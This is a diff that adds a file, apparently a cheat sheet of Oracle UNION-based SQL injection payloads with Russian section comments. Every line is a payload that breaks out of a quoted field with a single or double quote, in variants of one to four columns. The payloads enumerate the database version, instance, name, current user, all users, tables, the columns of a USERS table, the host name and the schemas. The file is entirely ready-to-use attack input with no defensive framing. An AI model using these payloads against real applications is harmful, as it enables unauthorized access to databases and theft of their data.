@@ -1,0 +1,125 @@
+' UNION  SELECT banner,NULL FROM v$version --
+' UNION  SELECT version,NULL FROM v$instance --
+' UNION SELECT 'abc','def' FROM dual--
+
+-- 🟢 Проверка соединения с базой через dual
+' UNION SELECT 'abc' FROM dual -- 
+' UNION SELECT 'abc', 'def' FROM dual -- 
+' UNION SELECT 'abc', 'def', 'GH' FROM dual -- 
+' UNION SELECT 'abc', 'def', 'GH', 'XYZ' FROM dual -- 
+
+-- 🟢 Проверка соединения с базой через dual
+" UNION SELECT 'abc' FROM dual --
+" UNION SELECT 'abc', 'def' FROM dual --
+" UNION SELECT 'abc', 'def', 'GH' FROM dual --
+" UNION SELECT 'abc', 'def', 'GH', 'XYZ' FROM dual --
+
+
+-- 🟢 Получение версии базы данных через v$version
+' UNION SELECT banner FROM v$version -- 
+' UNION SELECT banner, NULL FROM v$version -- 
+' UNION SELECT banner, NULL, NULL FROM v$version -- 
+' UNION SELECT banner, NULL, NULL, NULL FROM v$version -- 
+
+-- 🟢 Получение версии базы через v$instance
+' UNION SELECT version FROM v$instance -- 
+' UNION SELECT version, NULL FROM v$instance -- 
+' UNION SELECT version, NULL, NULL FROM v$instance -- 
+' UNION SELECT version, NULL, NULL, NULL FROM v$instance -- 
+
+-- 🟢 Получение имени базы данных
+' UNION SELECT name FROM v$database -- 
+' UNION SELECT name, NULL FROM v$database -- 
+' UNION SELECT name, NULL, NULL FROM v$database -- 
+' UNION SELECT name, NULL, NULL, NULL FROM v$database -- 
+
+-- 🟢 Получение имени текущего пользователя
+' UNION SELECT user FROM dual -- 
+' UNION SELECT user, NULL FROM dual -- 
+' UNION SELECT user, NULL, NULL FROM dual -- 
+' UNION SELECT user, NULL, NULL, NULL FROM dual -- 
+
+-- 🟢 Получение списка пользователей
+' UNION SELECT username FROM all_users -- 
+' UNION SELECT username, NULL FROM all_users -- 
+' UNION SELECT username, NULL, NULL FROM all_users -- 
+' UNION SELECT username, NULL, NULL, NULL FROM all_users -- 
+
+-- 🟢 Получение списка всех таблиц
+' UNION SELECT table_name FROM all_tables WHERE rownum = 1 -- 
+' UNION SELECT table_name, NULL FROM all_tables WHERE rownum = 1 -- 
+' UNION SELECT table_name, NULL, NULL FROM all_tables WHERE rownum = 1 -- 
+' UNION SELECT table_name, NULL, NULL, NULL FROM all_tables WHERE rownum = 1 -- 
+
+-- 🟢 Получение списка колонок в таблице USERS
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS' -- 
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS' -- 
+' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='USERS' -- 
+' UNION SELECT column_name, NULL, NULL, NULL FROM all_tab_columns WHERE table_name='USERS' -- 
+
+-- 🟢 Получение имени хоста, где работает база
+' UNION SELECT sys_context('USERENV', 'HOST') FROM dual -- 
+' UNION SELECT sys_context('USERENV', 'HOST'), NULL FROM dual -- 
+' UNION SELECT sys_context('USERENV', 'HOST'), NULL, NULL FROM dual -- 
+' UNION SELECT sys_context('USERENV', 'HOST'), NULL, NULL, NULL FROM dual -- 
+
+-- 🟢 Получение списка схем
+' UNION SELECT distinct owner FROM all_tables -- 
+' UNION SELECT distinct owner, NULL FROM all_tables -- 
+' UNION SELECT distinct owner, NULL, NULL FROM all_tables -- 
+' UNION SELECT distinct owner, NULL, NULL, NULL FROM all_tables --
+
+
+-- 🟢 Получение версии базы данных через v$version
+" UNION SELECT banner FROM v$version -- 
+" UNION SELECT banner, NULL FROM v$version -- 
+" UNION SELECT banner, NULL, NULL FROM v$version -- 
+" UNION SELECT banner, NULL, NULL, NULL FROM v$version -- 
+
+-- 🟢 Получение версии базы через v$instance
+" UNION SELECT version FROM v$instance -- 
+" UNION SELECT version, NULL FROM v$instance -- 
+" UNION SELECT version, NULL, NULL FROM v$instance -- 
+" UNION SELECT version, NULL, NULL, NULL FROM v$instance -- 
+
+-- 🟢 Получение имени базы данных
+" UNION SELECT name FROM v$database -- 
+" UNION SELECT name, NULL FROM v$database -- 
+" UNION SELECT name, NULL, NULL FROM v$database -- 
+" UNION SELECT name, NULL, NULL, NULL FROM v$database -- 
+
+-- 🟢 Получение имени текущего пользователя
+" UNION SELECT user FROM dual -- 
+" UNION SELECT user, NULL FROM dual -- 
+" UNION SELECT user, NULL, NULL FROM dual -- 
+" UNION SELECT user, NULL, NULL, NULL FROM dual -- 
+
+-- 🟢 Получение списка пользователей
+" UNION SELECT username FROM all_users -- 
+" UNION SELECT username, NULL FROM all_users -- 
+" UNION SELECT username, NULL, NULL FROM all_users -- 
+" UNION SELECT username, NULL, NULL, NULL FROM all_users -- 
+
+-- 🟢 Получение списка всех таблиц
+" UNION SELECT table_name FROM all_tables WHERE rownum = 1 -- 
+" UNION SELECT table_name, NULL FROM all_tables WHERE rownum = 1 -- 
+" UNION SELECT table_name, NULL, NULL FROM all_tables WHERE rownum = 1 -- 
+" UNION SELECT table_name, NULL, NULL, NULL FROM all_tables WHERE rownum = 1 -- 
+
+-- 🟢 Получение списка колонок в таблице USERS
+" UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS' -- 
+" UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS' -- 
+" UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='USERS' -- 
+" UNION SELECT column_name, NULL, NULL, NULL FROM all_tab_columns WHERE table_name='USERS' -- 
+
+-- 🟢 Получение имени хоста, где работает база
+" UNION SELECT sys_context('USERENV', 'HOST') FROM dual -- 
+" UNION SELECT sys_context('USERENV', 'HOST'), NULL FROM dual -- 
+" UNION SELECT sys_context('USERENV', 'HOST'), NULL, NULL FROM dual -- 
+" UNION SELECT sys_context('USERENV', 'HOST'), NULL, NULL, NULL FROM dual -- 
+
+-- 🟢 Получение списка схем
+" UNION SELECT distinct owner FROM all_tables -- 
+" UNION SELECT distinct owner, NULL FROM all_tables -- 
+" UNION SELECT distinct owner, NULL, NULL FROM all_tables -- 
+" UNION SELECT distinct owner, NULL, NULL, NULL FROM all_tables --
